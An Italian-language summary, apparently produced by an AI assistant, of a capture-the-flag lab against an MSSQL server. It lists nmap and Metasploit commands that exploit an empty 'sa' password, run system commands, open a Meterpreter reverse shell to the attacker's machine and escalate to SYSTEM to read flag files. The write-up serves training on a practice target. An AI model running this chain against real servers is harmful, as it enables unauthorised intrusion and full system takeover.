Ecco un riepilogo in Markdown di tutti i passaggi che abbiamo eseguito:


# Riepilogo Lab MSSQL CTF

## 1. Scansione iniziale con Nmap
- Comando:
  ```bash
  nmap -p1433 --script ms-sql-empty-password target.ine.local


* Risultato:

  * Utente `sa` con **password vuota** → login SQL Server riuscito.

## 2. Recupero Flag 1 con Metasploit (`mssql_exec`)

* Caricamento modulo:

  ```bash
  use auxiliary/admin/mssql/mssql_exec
  set RHOSTS target.ine.local
  set RPORT 1433
  set USERNAME sa
  set PASSWORD ""
  set DBNAME master
  ```
* Elenco file “flag” e lettura in un colpo solo:

  ```bash
  set CMD cmd.exe /c "type C:\flag1.txt & type C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt"
  run
  ```
* Output:

  * Contenuto di `C:\flag1.txt`
  * Contenuto di `C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt`

## 3. Privilege Escalation a SYSTEM

* **Metodo Meterpreter + getsystem**:
  1\.

  ```bash
  use exploit/windows/mssql/mssql_payload
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  set LHOST <tuo_IP_Kali>
  set LPORT 4444
  run
  ```

  2. ```bash
     sessions -i <ID_sessione>
     meterpreter > getsystem
     meterpreter > shell
     ```
* Ora abbiamo permessi **NT AUTHORITY\SYSTEM**.

## 4. Recupero Flag 2 (Windows config)

* Dal prompt Windows (`cmd.exe` in sessione SYSTEM):

  ```bat
  C:\> findstr /S /I /P "flag" "C:\Windows\System32\config\*.*"
  ```
* Lettura file trovato:

  ```bat
  C:\> type "C:\Windows\System32\config\<nome_file_trovato>"
  ```

## 5. Recupero Flag 4 (Administrator)

* Sempre dal prompt SYSTEM:

  ```bat
  C:\> findstr /S /I /P "flag" "C:\Users\Administrator\*.*"
  ```
* Lettura file trovato:

  ```bat
  C:\> type "C:\Users\Administrator\<percorso_file_trovato>"
  ```

---

Con questi passaggi abbiamo:

1. **Identificato** `sa` senza password
2. **Recuperato** Flag 1
3. **Escalato** a SYSTEM
4. **Cercato** e **letto** Flag 2 nella cartella di configurazione
5. **Cercato** e **letto** Flag 4 nella cartella Administrator

